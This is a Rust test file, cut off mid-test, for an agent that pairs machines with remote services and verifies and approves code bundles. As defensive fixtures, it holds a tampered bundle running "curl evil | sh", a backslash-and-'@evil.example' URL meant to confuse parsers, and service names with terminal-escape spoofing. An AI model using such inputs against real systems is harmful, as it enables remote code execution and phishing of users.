//! The machine's own state and its HTTP conversations with services:
//! the home, its files and its lock, settings, pairing, approvals and
//! unpairing.

mod support;

use std::path::{Path, PathBuf};
use std::time::Duration;

use moil_agent::home::{GITIGNORE, README_TEXT, SERVICE_GITIGNORE};
use moil_agent::report::Problem;
use moil_agent::{Error, Home, Machine, MachineConfig, MemorySecrets, Service, Settings};
use moil_bundle::{Bundle, BundleError, LineKind, LoadError};
use support::*;

/// Approves `bundle` for `service`, as the owner would after reviewing it.
async fn approve(machine: &Machine, service: &FakeService, id: &Service, bundle: &Bundle) {
    service.host(bundle);
    let review = machine.review(&id.id, bundle.hash()).await.unwrap();
    machine.approve(&review).unwrap();
}

/// Where the files of `bundle`, approved for `service`, are.
fn approved_dir(machine: &Machine, service: &Service, bundle: &Bundle) -> PathBuf {
    let name = &bundle.manifest().name;
    machine
        .home()
        .approved_bundle_dir(&service.id, name, &bundle.hash())
}

/// Changes a file moil wrote read-only, as the owner may.
fn overwrite(path: &Path, text: &str) {
    let mut permissions = std::fs::metadata(path).unwrap().permissions();
    #[allow(clippy::permissions_set_readonly_false)]
    permissions.set_readonly(false);
    std::fs::set_permissions(path, permissions).unwrap();
    std::fs::write(path, text).unwrap();
}

/// Edits a JSON file of the home, as the owner may.
fn edit_json(path: &Path, edit: impl FnOnce(&mut serde_json::Value)) {
    let mut value = serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
    edit(&mut value);
    std::fs::write(path, serde_json::to_string_pretty(&value).unwrap()).unwrap();
}

/// The problem reported for `path`, a path relative to the home.
fn problem_at<'a>(problems: &'a [Problem], path: &str) -> &'a Problem {
    problems
        .iter()
        .find(|p| p.path == Path::new(path))
        .unwrap_or_else(|| panic!("no problem with {path} in {problems:#?}"))
}

#[test]
fn a_home_is_open_in_one_process_at_a_time() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let clone = machine.clone();
    drop(machine);

    // Another process (here, another open) is turned away while any clone
    // of the machine lives.
    let config = || MachineConfig {
        home: Home::new(dir.path()),
        secrets: std::sync::Arc::new(MemorySecrets::default()),
        app_version: "0.1.0-test".into(),
    };
    match Machine::open(config()) {
        Err(Error::AlreadyRunning(path)) => assert_eq!(path, dir.path()),
        other => panic!("expected AlreadyRunning, got {other:?}"),
    }
    drop(clone);
    Machine::open(config()).expect("the lock is released with the last clone");
}

#[tokio::test]
async fn a_machine_can_be_read_while_another_process_has_it_open() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);

    assert!(matches!(
        Machine::open(config(dir.path())),
        Err(Error::AlreadyRunning(_))
    ));
    let reader = Machine::open_read_only(config(dir.path())).unwrap();
    assert!(reader.is_paired(&paired).unwrap());
    assert_eq!(reader.services().unwrap(), std::slice::from_ref(&paired));
    assert_eq!(reader.find_service("klisi").unwrap(), paired);
    assert_eq!(reader.bundles(&paired.id).await.unwrap(), [info(&bundle)]);
    let review = reader.review(&paired.id, bundle.hash()).await.unwrap();
    assert_eq!((&review.bundle, review.approved), (&bundle, false));

    // It sees what the process that has the machine open changes.
    machine.approve(&review).unwrap();
    assert!(reader.services().unwrap()[0].is_approved(&bundle.hash()));
    let review = reader.review(&paired.id, bundle.hash()).await.unwrap();
    assert!(review.approved);
}

#[test]
fn reading_a_machine_changes_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("moil");
    let reader = Machine::open_read_only(MachineConfig {
        home: Home::new(&root),
        secrets: std::sync::Arc::new(MemorySecrets::default()),
        app_version: "0.1.0-test".into(),
    })
    .unwrap();
    assert_eq!(reader.services().unwrap(), []);
    assert!(!root.exists(), "a home that wasn't there still isn't");
}

#[test]
fn opening_creates_the_home() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("a").join("moil");
    let machine = open_machine(&root);
    assert!(root.join("services").is_dir());
    assert!(root.join(".machine/agent.lock").is_file());
    assert_eq!(machine.home().root(), root);
    assert_eq!(machine.settings(), Settings::default());
}

#[test]
fn the_home_explains_itself_and_keeps_this_machines_files_out_of_git() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    let klisi = root.join("services/klisi.example.com");
    std::fs::create_dir_all(&klisi).unwrap();
    drop(open_machine(root));
    assert_eq!(
        std::fs::read_to_string(root.join("README.md")).unwrap(),
        README_TEXT
    );
    assert_eq!(
        std::fs::read_to_string(root.join(".gitignore")).unwrap(),
        GITIGNORE
    );
    assert_eq!(
        std::fs::read_to_string(klisi.join(".gitignore")).unwrap(),
        SERVICE_GITIGNORE
    );

    // The README is moil's, and kept current; the .gitignore files are the
    // owner's once written.
    std::fs::write(root.join("README.md"), "an older moil's words\n").unwrap();
    std::fs::write(root.join(".gitignore"), "/.machine/\n").unwrap();
    std::fs::remove_file(klisi.join(".gitignore")).unwrap();
    drop(open_machine(root));
    assert_eq!(
        std::fs::read_to_string(root.join("README.md")).unwrap(),
        README_TEXT
    );
    assert_eq!(
        std::fs::read_to_string(root.join(".gitignore")).unwrap(),
        "/.machine/\n"
    );
    assert_eq!(
        std::fs::read_to_string(klisi.join(".gitignore")).unwrap(),
        SERVICE_GITIGNORE
    );
}

/// What the `.gitignore` files moil writes keep out of git, asked of git
/// itself, for the whole home as one repository and for a service's folder
/// as one of its own (spec/machine.md §1.2).
#[test]
fn git_keeps_out_what_belongs_to_this_machine_alone() {
    if std::process::Command::new("git")
        .arg("--version")
        .output()
        .is_err()
    {
        eprintln!("skipped: git isn't installed");
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    let klisi = root.join("services/klisi.example.com");
    std::fs::create_dir_all(&klisi).unwrap();
    drop(open_machine(root));
    let ignored = |repository: &Path, path: &str| {
        let git = |args: &[&str]| {
            std::process::Command::new("git")
                .args(args)
                .current_dir(repository)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .output()
                .unwrap()
        };
        if !repository.join(".git").exists() {
            assert!(git(&["init", "-q"]).status.success());
        }
        git(&["check-ignore", "-q", "--no-index", path])
            .status
            .success()
    };
    for (path, expected) in [
        (".machine/secrets.json", true),
        ("settings.json", true),
        ("logs/moil.log", true),
        ("services/klisi.example.com/pairing.json", true),
        ("services/klisi.example.com/logs/transcribe.log", true),
        ("README.md", false),
        (".gitignore", false),
        ("services/klisi.example.com/service.json", false),
        (
            "services/klisi.example.com/bundles/transcribe/abc/job.py",
            false,
        ),
        ("services/klisi.example.com/hooks/transcribe", false),
    ] {
        assert_eq!(
            ignored(root, path),
            expected,
            "{path} in the home's repository"
        );
    }
    std::fs::remove_dir_all(root.join(".git")).unwrap();
    for (path, expected) in [
        ("pairing.json", true),
        ("logs/transcribe.log", true),
        ("service.json", false),
        ("hooks/transcribe", false),
    ] {
        assert_eq!(
            ignored(&klisi, path),
            expected,
            "{path} in the service's repository"
        );
    }
}

#[cfg(unix)]
#[test]
fn only_the_owner_can_read_the_home() {
    use std::os::unix::fs::PermissionsExt;
    let mode =
        |path: &std::path::Path| std::fs::metadata(path).unwrap().permissions().mode() & 0o777;
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("share").join("moil");
    drop(open_machine(&root));
    assert_eq!(mode(&root), 0o700, "a new home");
    assert_eq!(mode(&root.join(".machine")), 0o700);

    // An older moil left it readable by everyone.
    std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o755)).unwrap();
    drop(open_machine(&root));
    assert_eq!(mode(&root), 0o700, "a home made private");
}

#[test]
fn settings_survive_a_restart() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let updated = machine
        .update_settings(|s| {
            s.paused = true;
            s.machine_name = Some("build-box".into());
        })
        .unwrap();
    assert!(updated.paused);
    drop(machine);

    let machine = open_machine(dir.path());
    assert_eq!(machine.settings(), updated);
    assert_eq!(machine.info().name, "build-box");
}

/// A guess could take jobs the owner meant to pause (spec/machine.md
/// §1.1).
#[test]
fn moil_wont_start_with_settings_it_cant_trust() {
    let dir = tempfile::tempdir().unwrap();
    let settings = dir.path().join("settings.json");
    for (text, why) in [
        ("{\"paused\": maybe}", "expected value"),
        ("{\"pause\": true}", "unknown field `pause`"),
        (
            "{\"paused\": true, \"paused\": false}",
            "duplicate key \"paused\"",
        ),
        ("[true]", "one JSON object"),
    ] {
        std::fs::write(&settings, text).unwrap();
        let err = Machine::open(config(dir.path())).unwrap_err();
        assert!(matches!(err, Error::Invalid { .. }), "{err}");
        let message = err.to_string();
        assert!(
            message.contains(&settings.display().to_string()) && message.contains(why),
            "{text}: {message}"
        );

        // It can still be looked at, and says what's wrong.
        let reader = Machine::open_read_only(config(dir.path())).unwrap();
        assert_eq!(reader.settings(), Settings::default());
        let problems = reader.problems();
        let problem = problem_at(&problems, "settings.json");
        assert!(problem.message.contains(why), "{problem:?}");
    }

    std::fs::write(&settings, "{\"paused\": true}\n").unwrap();
    let machine = open_machine(dir.path());
    assert!(machine.settings().paused, "every other field is optional");
    assert!(machine.problems().is_empty(), "{:?}", machine.problems());
}

#[test]
fn the_runtime_runs_by_the_owners_settings() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let config = machine.runtime_config("/opt/uv".into());
    assert_eq!(config.uv, std::path::Path::new("/opt/uv"));
    // Everything the runtime keeps is moil's own.
    let own = dir.path().join(".machine");
    assert_eq!(config.jobs_dir, own.join("jobs"));
    assert_eq!(config.bundles.root(), own.join("bundles"));
    assert_eq!(config.bundles.root(), machine.home().bundle_store().root());
    assert_eq!(config.assets_dir, own.join("cache/assets"));
    assert_eq!(config.environments_dir, own.join("cache/environments"));
    assert!(!config.allow_insecure_http && !config.keep_work_dirs);

    machine
        .update_settings(|s| {
            s.allow_insecure_http = true;
            s.keep_work_dirs = true;
        })
        .unwrap();
    drop(machine);
    let config = open_machine(dir.path()).runtime_config("/opt/uv".into());
    assert!(config.allow_insecure_http && config.keep_work_dirs);
}

#[test]
fn info_describes_this_machine() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let info = machine.info();
    assert!(!info.name.is_empty());
    assert_eq!(info.os, std::env::consts::OS);
    assert_eq!(info.arch, std::env::consts::ARCH);
    assert!(info.cpus >= 1 && info.memory_bytes > 0, "{info:?}");

    machine
        .update_settings(|s| s.machine_name = Some(format!("  {}  ", "x".repeat(80))))
        .unwrap();
    assert_eq!(
        machine.info().name,
        "x".repeat(64),
        "names are trimmed to 64 characters"
    );
}

#[tokio::test]
async fn pairing_stores_the_service_and_its_token() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    machine
        .update_settings(|s| s.machine_name = Some("Ada's MacBook Pro".into()))
        .unwrap();

    service.script_pairing([TokenReply::Pending, TokenReply::Pending, TokenReply::Grant]);
    let session = machine
        .pair(&format!("{}/", service.base_url))
        .await
        .unwrap();
    assert_eq!(session.user_code, "WDJB-MJHT");
    assert_eq!(session.service_name, "klisi");
    assert_eq!(
        session.verification_uri_complete,
        format!("{}/pair?code=WDJB-MJHT", service.base_url)
    );
    let paired = within("pairing", session.wait()).await.unwrap();

    assert_eq!(service.polls().len(), 3);
    let request = &service.pair_requests()[0];
    assert_eq!(request.name, "Ada's MacBook Pro");
    assert_eq!(request.os, std::env::consts::OS);
    assert_eq!(request.arch, std::env::consts::ARCH);
    assert_eq!(request.app_version, "0.1.0-test");

    let port = service
        .base_url
        .split(':')
        .nth(2)
        .unwrap()
        .split('/')
        .next()
        .unwrap();
    assert_eq!(paired.id.as_str(), format!("127.0.0.1-{port}"));
    assert_eq!(
        paired.base_url.as_str(),
        service.base_url,
        "the trailing slash is dropped"
    );
    assert_eq!(paired.name, "klisi");
    let pairing = paired.pairing.as_ref().expect("paired");
    assert_eq!(pairing.machine_id, "m_1");
    assert_eq!(pairing.base_url, paired.base_url);
    assert!(paired.approvals.is_empty());

    // The service's folder says what the service is, and what this
    // machine's pairing with it is, as spec/machine.md §1.2 shows.
    let folder = dir.path().join("services").join(paired.id.as_str());
    let read = |name: &str| -> serde_json::Value {
        let text = std::fs::read_to_string(folder.join(name)).unwrap();
        assert!(
            text.ends_with("}\n"),
            "{name} is pretty with a trailing newline"
        );
        serde_json::from_str(&text).unwrap()
    };
    assert_eq!(
        read("service.json"),
        serde_json::json!({"base_url": service.base_url, "name": "klisi", "approvals": []})
    );
    let pairing_file = read("pairing.json");
    assert_eq!(pairing_file["base_url"], service.base_url.as_str());
    assert_eq!(pairing_file["machine_id"], "m_1");
    let paired_at = pairing_file["paired_at"].as_str().unwrap();
    assert!(
        paired_at.len() == 20 && paired_at.ends_with('Z'),
        "{paired_at}"
    );
    assert_eq!(
        std::fs::read_to_string(folder.join(".gitignore")).unwrap(),
        SERVICE_GITIGNORE
    );

    // Both the service and its token outlive the process. The token is
    // never in the service's folder.
    drop(machine);
    let machine = open_machine(dir.path());
    assert_eq!(machine.services().unwrap(), std::slice::from_ref(&paired));
    assert!(machine.is_paired(&paired).unwrap());
    let tokens = issued_tokens(dir.path());
    assert_eq!(
        tokens.values().collect::<Vec<_>>(),
        [&(service.base_url.clone(), "moil_token_1".to_owned())],
        "the token is kept with the URL it was issued for"
    );
    for file in std::fs::read_dir(&folder).unwrap() {
        let text = std::fs::read_to_string(file.unwrap().path()).unwrap();
        assert!(!text.contains("moil_token_1"), "{text}");
    }
    assert_eq!(machine.bundles(&paired.id).await.unwrap(), []);
}

#[tokio::test]
async fn a_service_learns_the_machines_name_cut_to_64_characters() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let name = format!("Ada's {}", "very ".repeat(20));
    machine
        .update_settings(|s| s.machine_name = Some(name.clone()))
        .unwrap();
    pair(&machine, &service).await;
    assert_eq!(service.pair_requests()[0].name, name[..64]);
}

#[tokio::test]
async fn a_rejected_pairing_stores_nothing() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    service.script_pairing([TokenReply::Pending, TokenReply::Denied]);
    let session = machine.pair(&service.base_url).await.unwrap();
    let err = within("pairing", session.wait()).await.unwrap_err();
    assert!(matches!(err, Error::PairingDenied), "{err}");
    assert!(machine.services().unwrap().is_empty());
    assert!(tokens(dir.path()).is_empty());
}

#[tokio::test]
async fn an_expired_code_ends_the_pairing() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    // The service says so...
    service.script_pairing([TokenReply::Expired]);
    let session = machine.pair(&service.base_url).await.unwrap();
    let err = within("pairing", session.wait()).await.unwrap_err();
    assert!(matches!(err, Error::PairingExpired), "{err}");

    // ...or the machine notices on its own and stops polling.
    service.pairing_timing(0, 0);
    let polls = service.polls().len();
    let session = machine.pair(&service.base_url).await.unwrap();
    let err = within("pairing", session.wait()).await.unwrap_err();
    assert!(matches!(err, Error::PairingExpired), "{err}");
    assert_eq!(service.polls().len(), polls, "an expired code isn't polled");
    assert!(machine.services().unwrap().is_empty());
}

#[tokio::test]
async fn slow_down_lengthens_every_later_interval() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    let step = Duration::from_millis(150);
    service.script_pairing([
        TokenReply::Pending,
        TokenReply::SlowDown,
        TokenReply::Pending,
        TokenReply::Grant,
    ]);
    let session = machine
        .pair(&service.base_url)
        .await
        .unwrap()
        .with_slow_down(step);
    within("pairing", session.wait()).await.unwrap();

    let polls = service.polls();
    let gaps: Vec<Duration> = polls.windows(2).map(|w| w[1] - w[0]).collect();
    assert!(gaps[0] < step, "no slowing down before asked: {gaps:?}");
    assert!(
        gaps[1] >= step && gaps[2] >= step,
        "slowed down for good: {gaps:?}"
    );
}

#[tokio::test]
async fn a_struggling_service_doesnt_end_the_pairing() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    service.script_pairing([
        TokenReply::Unavailable,
        TokenReply::Unavailable,
        TokenReply::Grant,
    ]);
    let session = machine.pair(&service.base_url).await.unwrap();
    let paired = within("pairing", session.wait()).await.unwrap();
    assert_eq!(paired.name, "klisi");
}

#[tokio::test]
async fn pairing_only_starts_with_a_moil_service() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    for (reply, expected) in [
        (InfoReply::NotFound, "404"),
        (InfoReply::Html, "doesn't describe a moil service"),
        (InfoReply::Protocol(2), "protocol 2"),
    ] {
        service.set_info(reply.clone());
        match machine.pair(&service.base_url).await {
            Err(Error::NotAService { reason, .. }) => {
                assert!(reason.contains(expected), "{reply:?}: {reason}")
            }
            other => panic!("{reply:?}: expected NotAService, got {other:?}"),
        }
    }
    assert!(service.pair_requests().is_empty(), "no pairing was started");
}

#[tokio::test]
async fn a_service_is_paired_only_under_a_name_that_hides_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    for name in [
        "klisi\x1b[2J\x1b[Hyour-bank",
        "klisi\r",
        "",
        &"x".repeat(65),
    ] {
        let service = FakeService::start(name).await;
        match machine.pair(&service.base_url).await {
            Err(Error::NotAService { reason, .. }) => {
                assert!(reason.contains("calls itself"), "{reason}");
            }
            other => panic!("paired with {name:?}: {other:?}"),
        }
        assert_eq!(service.pair_requests(), [], "{name:?}");
    }
    assert_eq!(machine.services().unwrap(), []);

    // What isn't a control character is shown revealed instead (spec
    // §5.5).
    for name in ["é".repeat(64), "klisi\u{202e}".to_owned()] {
        let service = FakeService::start(&name).await;
        assert_eq!(pair(&machine, &service).await.name, name);
    }
}

/// A service can't pass off another service's confirmation page as its
/// own: relaying another service's pairing, it would have the owner pair
/// the relay's machine with their account there (spec §4).
#[tokio::test]
async fn pairing_is_confirmed_only_on_the_services_own_origin() {
    let klisi = FakeService::start("klisi").await;
    let relay = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    let theirs = format!("{}/pair", klisi.base_url);
    let own = format!("{}/pair", relay.base_url);
    let klisi_site = url::Url::parse(&klisi.base_url)
        .unwrap()
        .origin()
        .ascii_serialization();
    for (page, complete) in [(&theirs, &theirs), (&own, &theirs), (&theirs, &own)] {
        relay.pairing_pages(page, &format!("{complete}?code=WDJB-MJHT"));
        match machine.pair(&relay.base_url).await {
            Err(Error::ForeignPairingPage { site, .. }) => assert_eq!(site, klisi_site),
            other => panic!("paired with {page} and {complete}: {other:?}"),
        }
    }
    assert!(relay.polls().is_empty(), "no token was asked for");
    assert!(machine.services().unwrap().is_empty());
}

/// Browsers and the operating system parse URLs their own ways: the
/// owner is sent to the page as moil parsed it to check its origin.
#[tokio::test]
async fn the_confirmation_page_checked_is_the_one_opened() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let origin = service.base_url.trim_end_matches("/moil");

    // A backslash that a parser could read as a user name's end.
    let page = format!("{origin}\\@evil.example/pair");
    service.pairing_pages(&page, &format!(" {page}?code=WDJB MJHT"));
    let session = machine.pair(&service.base_url).await.unwrap();
    assert_eq!(
        session.verification_uri,
        format!("{origin}/@evil.example/pair")
    );
    assert_eq!(
        session.verification_uri_complete,
        format!("{origin}/@evil.example/pair?code=WDJB%20MJHT")
    );
}

#[tokio::test]
async fn plain_http_is_refused_except_to_loopback_or_when_allowed() {
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());

    let err = machine.pair("http://moil.invalid/moil").await.unwrap_err();
    assert!(matches!(err, Error::InsecureUrl(_)), "{err}");
    let err = machine.pair("ftp://moil.invalid/moil").await.unwrap_err();
    assert!(matches!(err, Error::InvalidAddress(_)), "{err}");

    // With the owner's permission the machine goes on and tries to reach it.
    machine
        .update_settings(|s| s.allow_insecure_http = true)
        .unwrap();
    let err = machine.pair("http://moil.invalid/moil").await.unwrap_err();
    assert!(matches!(err, Error::Http(_)), "{err}");
}

#[tokio::test]
async fn pairing_again_replaces_the_token_and_keeps_the_approvals() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let first = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);
    let review = machine.review(&first.id, bundle.hash()).await.unwrap();
    machine.approve(&review).unwrap();

    let second = pair(&machine, &service).await;
    assert_eq!(second.id, first.id);
    assert_eq!(second.pairing.as_ref().unwrap().machine_id, "m_2");
    assert!(second.is_approved(&bundle.hash()));
    assert_eq!(machine.services().unwrap(), [second]);

    // The service is asked to forget the machine it knew by the old token,
    // in the background, and the new token is the only one kept.
    until("the old token to be forgotten", || {
        service.forgotten() == ["moil_token_1"]
    })
    .await;
    assert_eq!(
        tokens(dir.path()).values().collect::<Vec<_>>(),
        ["moil_token_2"]
    );
}

#[tokio::test]
async fn services_are_found_by_id_host_url_or_name() {
    let one = FakeService::start("klisi").await;
    let two = FakeService::start("klisi").await;
    let other = FakeService::start("notes").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let one = (pair(&machine, &one).await, one);
    pair(&machine, &two).await;
    let other = pair(&machine, &other).await;

    let found = |query: &str| machine.find_service(query).map(|s| s.id);
    assert_eq!(found(one.0.id.as_str()).unwrap(), one.0.id);
    assert_eq!(found(&one.1.base_url).unwrap(), one.0.id);
    assert_eq!(found(&format!("{}/", one.1.base_url)).unwrap(), one.0.id);
    let host_port = one.0.base_url.authority().to_owned();
    assert_eq!(found(&host_port).unwrap(), one.0.id);
    assert_eq!(found("NOTES").unwrap(), other.id);

    match found("klisi") {
        Err(Error::AmbiguousService { matches, .. }) => {
            assert!(matches.contains(one.0.id.as_str()), "{matches}")
        }
        other => panic!("expected an ambiguity, got {other:?}"),
    }
    assert!(matches!(
        found("127.0.0.1"),
        Err(Error::AmbiguousService { .. })
    ));
    assert!(matches!(found("nothing"), Err(Error::UnknownService(_))));
}

#[tokio::test]
async fn what_moil_cant_make_sense_of_under_services_is_reported_and_ignored() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let services = dir.path().join("services");

    // A folder name that isn't an ID could have moil write outside its
    // home, or confuse two services on a file system that ignores case.
    std::fs::create_dir(services.join("Klisi.Example.com")).unwrap();
    std::fs::write(services.join("klisi.json"), "{}").unwrap();
    std::fs::create_dir(services.join("notes.example.com")).unwrap();
    std::fs::create_dir(services.join(".git")).unwrap();

    assert_eq!(machine.services().unwrap(), [paired]);
    let problems = machine.problems();
    assert_eq!(problems.len(), 3, "{problems:#?}");
    assert!(
        problem_at(&problems, "services/Klisi.Example.com")
            .message
            .contains("isn't one"),
        "{problems:#?}"
    );
    problem_at(&problems, "services/klisi.json");
    assert!(
        problem_at(&problems, "services/notes.example.com")
            .message
            .contains("no service.json"),
        "{problems:#?}"
    );
}

#[tokio::test]
async fn review_shows_the_verified_bundle() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);

    assert_eq!(machine.bundles(&paired.id).await.unwrap(), [info(&bundle)]);
    let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
    assert_eq!(review.bundle, bundle);
    assert_eq!(review.service, paired);
    assert!(!review.approved && review.previous.is_none() && review.diff().is_none());

    let missing = support::bundle("other", "1.0.0", "").hash();
    let err = machine.review(&paired.id, missing).await.unwrap_err();
    assert!(
        matches!(err, Error::UnknownBundle(hash) if hash == missing),
        "{err}"
    );
}

#[tokio::test]
async fn a_tampered_bundle_is_rejected() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let honest = bundle("transcribe", "1.0.0", "print('hi')");
    let evil = bundle(
        "transcribe",
        "1.0.0",
        "import os; os.system('curl evil | sh')",
    );

    // The service claims the honest hash but sends other files.
    let mut response = evil.to_response();
    response.hash = honest.hash();
    service.serve_bundle(honest.hash(), response);

    let err = machine.review(&paired.id, honest.hash()).await.unwrap_err();
    assert!(
        matches!(err, Error::Bundle(BundleError::HashMismatch { expected, actual })
            if expected == honest.hash() && actual == evil.hash()),
        "{err}"
    );
    assert!(!machine.home().approved_bundles_dir(&paired.id).exists());
}

#[tokio::test]
async fn approval_is_for_exactly_the_reviewed_bundle() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    service.host(&bundle);
    let review = machine.review(&paired.id, bundle.hash()).await.unwrap();

    // Whatever the service serves after the review doesn't matter.
    let other = support::bundle("transcribe", "6.6.6", "print('bye')");
    service.serve_bundle(bundle.hash(), other.to_response());
    let approved = machine.approve(&review).unwrap();

    let approval = &approved.approvals[0];
    assert_eq!(approval.hash, bundle.hash());
    assert_eq!(
        (approval.name.as_str(), approval.version.as_str()),
        ("transcribe", "1.0.0")
    );
    assert_eq!(machine.service(&paired.id).unwrap(), approved);
    assert_eq!(
        machine.approved_bundle(&paired.id, bundle.hash()).unwrap(),
        Some(bundle.clone())
    );
    assert!(machine.review(&paired.id, bundle.hash()).await.is_err());
    assert_eq!(
        machine.approve(&review).unwrap(),
        approved,
        "approving twice changes nothing"
    );

    // Its files are in the service's folder, read-only.
    let dir = approved_dir(&machine, &paired, &bundle);
    for (name, text) in bundle.files() {
        let path = dir.join(name);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), text);
        assert!(std::fs::metadata(&path).unwrap().permissions().readonly());
    }

    // And they're checked on every use: changed, they're no longer the
    // approved bundle, and the approval no longer counts.
    overwrite(&dir.join("job.py"), "print('changed on disk')\n");
    let err = machine
        .approved_bundle(&paired.id, bundle.hash())
        .unwrap_err();
    assert!(
        matches!(
            err,
            Error::BundleLoad(LoadError::Invalid(BundleError::HashMismatch { .. }))
        ),
        "{err}"
    );
    assert!(
        !machine
            .service(&paired.id)
            .unwrap()
            .is_approved(&bundle.hash())
    );

    // Approving it again restores them.
    let review = machine.review(&paired.id, bundle.hash()).await;
    assert!(review.is_err(), "the service serves other files now");
    service.host(&bundle);
    let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
    assert!(!review.approved);
    assert_eq!(machine.approve(&review).unwrap(), approved);
    assert_eq!(
        machine.approved_bundle(&paired.id, bundle.hash()).unwrap(),
        Some(bundle)
    );
}

#[tokio::test]
async fn review_compares_with_the_last_approved_version() {
    let service = FakeService::start("klisi").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let paired = pair(&machine, &service).await;
    let v1 = bundle("transcribe", "1.0.0", "print('one')");
    let v2 = bundle("transcribe", "2.0.0", "print('two')");
    let v3 = bundle("transcribe", "3.0.0", "print('three')");
    let unrelated = bundle("summarize", "9.0.0", "print('nine')");
    for bundle in [&v1, &v2, &v3, &unrelated] {
        service.host(bundle);
    }
    for bundle in [&v1, &unrelated] {
        let review = machine.review(&paired.id, bundle.hash()).await.unwrap();
        machine.approve(&review).unwrap();
    }

    let review = machine.review(&paired.id, v2.hash()).await.unwrap();
    assert_eq!(review.previous.as_ref(), Some(&v1));
    let diff = review.diff().unwrap();
    let script = diff.iter().find(|d| d.name == "job.py").unwrap();
    let changed: Vec<(LineKind, &str)> = script
        .hunks
        .iter()
        .flat_map(|h| &h.lines)
        .filter(|l| l.kind != LineKind::Context)
        .map(|l| (l.kind, l.text.as_str()))
        .collect();
    assert_eq!(
        changed,
        [
            (LineKind::Removed, "print('one')"),
            (LineKind::Added, "print('two')")
        ]
    );
    assert!(
        diff.iter()
            .any(|d| d.name == "manifest.json" && !d.is_unchanged())
    );
    machine.approve(&review).unwrap();

    let review = machine.review(&paired.id, v3.hash()).await.unwrap();
    assert_eq!(
        review.previous.as_ref(),
        Some(&v2),
        "the most recent approval"
    );
    let review = machine.review(&paired.id, v2.hash()).await.unwrap();
    assert!(review.approved);
    assert_eq!(review.previous.as_ref(), Some(&v1), "never itself");
}

#[tokio::test]
async fn revoking_deletes_the_bundle_and_its_runtime_copy_once_unused() {
    let one = FakeService::start("klisi").await;
    let two = FakeService::start("notes").await;
    let dir = tempfile::tempdir().unwrap();
    let machine = open_machine(dir.path());
    let bundle = bundle("transcribe", "1.0.0", "print('hi')");
    let mut paired = Vec::new();
    for service in [&one, &two] {
        let id = pair(&machine, service).await;
        approve(&machine, service, &id, &bundle).await;
        paired.push(id);
    }
    // The copy the runtime runs, as it stores it before running.
    let store = machine.home().bundle_store();
    store.put(&bundle).unwrap();

    let revoked = machine.revoke(&paired[0].id, bundle.hash()).unwrap();
    assert!(!revoked.is_approved(&bundle.hash()));
    assert_eq!(
        machine
            .approved_bundle(&paired[0].id, bundle.hash())
            .unwrap(),
        None
    );
    let files = approved_dir(&machine, &paired[0], &bundle);
    assert!(
        !files.parent().unwrap().exists(),
        "the bundle's files go, and the emptied folder of its name"
    );
    let service_json = std::fs::read_to_string(machine.home().service_file(&paired[0].id)).unwrap();
    assert!(
        !service_json.contains(&bundle.hash().to_string()),
        "{service_json}"
    );
    assert!(
        store.get(&bundle.hash()).unwrap().is_some(),
        "the other service still approves it"
    );
    assert!(approved_dir(&machine, &paired[1], &bundle).is_dir());
    assert_eq!(
        machine.revoke(&paired[0].id, bundle.hash()).unwrap(),
        revoked,
        "revoking twice is harmless"
    );

